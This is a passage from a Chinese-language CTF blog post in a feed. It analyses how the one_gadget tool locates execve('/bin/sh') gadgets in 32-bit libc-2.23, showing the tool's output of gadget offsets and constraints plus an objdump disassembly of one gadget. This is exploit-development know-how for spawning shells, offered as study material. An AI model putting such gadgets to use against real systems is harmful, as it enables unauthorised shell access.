stripped</span><br></pre></td></tr></table></figure><p>可以找到很多<code>gadgets</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">λ one_gadget /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0x3ac5c execve(<span class="string">"/bin/sh"</span>, esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac5e execve(<span class="string">"/bin/sh"</span>, esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac62 execve(<span class="string">"/bin/sh"</span>, esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0x3ac69 execve(<span class="string">"/bin/sh"</span>, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc5 execl(<span class="string">"/bin/sh"</span>, eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line"></span><br><span class="line">0x5fbc6 execl(<span class="string">"/bin/sh"</span>, [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br></pre></td></tr></table></figure><p>这里以第四个<code>one_gadget</code>为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">λ objdump -d /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">...</span><br><span class="line">   3ac69:8b 86 48 ff ff ff    mov    eax,DWORD PTR [esi-0xb8]</span><br><span class="line">   3ac6f:83 c4 0c             add    esp,0xc</span><br><span class="line">   3ac72:c7 86 20 16 00 00 00 mov    DWORD PTR [esi+0x1620],0x0</span><br><span class="line">   3ac79:00 00 00</span><br><span class="line">   3ac7c:c7 86 24 16 00 00 00 mov    DWORD PTR [esi+0x1624],0x0</span><br><span class="line">   3ac83:00 00 00</span><br><span class="line">   3ac86:ff 30                push   DWORD PTR [eax]</span><br><span class="line">   3ac88:8d 44 24 2c          lea    eax,[esp+0x2c]</span><br><span class="line">   3ac8c:50                   push   eax</span><br><span class="line">   3ac8d:8d 86 0b 9a fa ff    lea    eax,[esi-0x565f5]</span><br><span class="line">   3ac93:50                   push   eax</span><br><span class="line">   3ac94:e8 47 5b 07 00       call   b07e0 &lt;execve@@GLIBC_2.0&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>32 位相较于 64 位有两个不同点：</p><ol><li>32 位下通过<code>[&lt;reg&gt;-0x??]</code>（寄存器加立即数，即寄存器寻址方式）来访问只读数据</li><li>32 位下函数的传参通过栈来实现，而不是寄存器</li></ol><p>最后 32 位下的<code>one_gadget</code>通过一个简单的符号执行实现，最后找到的<code>one_gadget</code>类似<code>execve(&quot;/bin/sh&quot;, argv, environ);</code>的形式。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不清楚&lt;code&gt;one_gadget&lt;/code&gt;具体原理是什么，打算看一下源码，做了一点草率的分析。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
